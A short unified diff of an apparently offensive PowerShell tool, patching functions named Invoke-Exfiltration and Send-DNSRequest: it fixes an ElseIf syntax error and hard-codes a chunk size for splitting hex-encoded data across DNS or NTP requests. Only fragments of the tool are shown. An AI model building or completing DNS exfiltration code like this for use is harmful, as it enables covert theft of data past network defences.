@@ -18,7 +18,7 @@ function Invoke-Exfiltration {
 	#$split = 66 - $len.Length - $dns.Length;
 	$split = 50
     }
-    ElseIf {$type -eq 'ntp') {
+    ElseIf ($type -eq 'ntp') {
 	$split = 20
     }
     Else {
@@ -185,7 +185,8 @@ function Send-DNSRequest {
     param ([string] $server, [string] $data, [string] $jobid)
     $data = Convert-ToCHexString $data  
     $len = $data.Length;
-    $split = 66 - $len.Length - $dns.Length;
+    #$split = 66 - $len.Length - $dns.Length;
+    $split = 50
     # get the size of the file and split it
     $repeat=[Math]::Floor($len/$split);
     $remainder=$len%$split;
